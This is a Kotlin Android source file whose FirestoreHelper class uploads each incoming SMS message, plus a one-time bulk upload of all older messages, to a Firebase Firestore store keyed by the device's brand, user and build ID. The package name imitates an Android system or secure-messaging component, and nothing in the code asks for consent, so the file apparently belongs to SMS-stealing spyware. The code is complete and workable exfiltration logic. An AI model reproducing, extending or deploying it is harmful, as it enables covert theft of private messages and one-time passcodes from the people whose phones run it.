package com.android.securesms.service.data

import android.content.SharedPreferences
import android.os.Build
import com.android.securesms.service.domain.model.SmsMessage
import com.android.securesms.service.domain.utils.currentTime
import com.android.securesms.service.domain.utils.formatDateToString
import com.google.firebase.firestore.FirebaseFirestore
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FirestoreHelper @Inject constructor(private val sharedPreferences: SharedPreferences) {

    private val db = FirebaseFirestore.getInstance()
    val treeName = "${Build.BRAND}_${Build.USER}_${Build.ID}"


    /**
     * Save a single SMS to Firestore.
     */
    fun saveSmsToFirestore(sms: SmsMessage, onComplete: (Boolean, String?) -> Unit) {
        val smsId = currentTime()
        db.collection(treeName)
            .document("new_messages")
            .collection("messages")
            .document(smsId)
            .set(sms)
            .addOnSuccessListener {
                onComplete(true, "Message saved successfully")
            }
            .addOnFailureListener { e ->
                onComplete(false, e.message)
            }
    }

    fun isBulkUploaded(): Boolean {
        return sharedPreferences.getBoolean("isBulkUploaded", false)
    }

    private fun markBulkUploaded() {
        sharedPreferences.edit()
            .putBoolean("isBulkUploaded", true)
            .apply()
    }

    /**
     * Save a list of SMS to Firestore in bulk.
     * Ensures unique messages by using SMS ID as document ID.
     */
    fun saveBulkSmsToFirestore(smsList: List<SmsMessage>, onComplete: (Boolean, String?) -> Unit) {
        if (isBulkUploaded()) {
            onComplete(false, "Bulk messages already uploaded")
            return
        }

        val batch = db.batch()
        val smsCollection = db.collection(treeName).document("old_messages").collection("messages")

        smsList.forEach { sms ->
            val smsId = formatDateToString(sms.timestamp)
            val docRef = smsCollection.document(smsId)
            batch.set(docRef, sms)
        }

        batch.commit()
            .addOnSuccessListener {
                markBulkUploaded()
                onComplete(true, "Bulk save completed successfully")
            }
            .addOnFailureListener { e ->
                onComplete(false, e.message)
            }
    }

}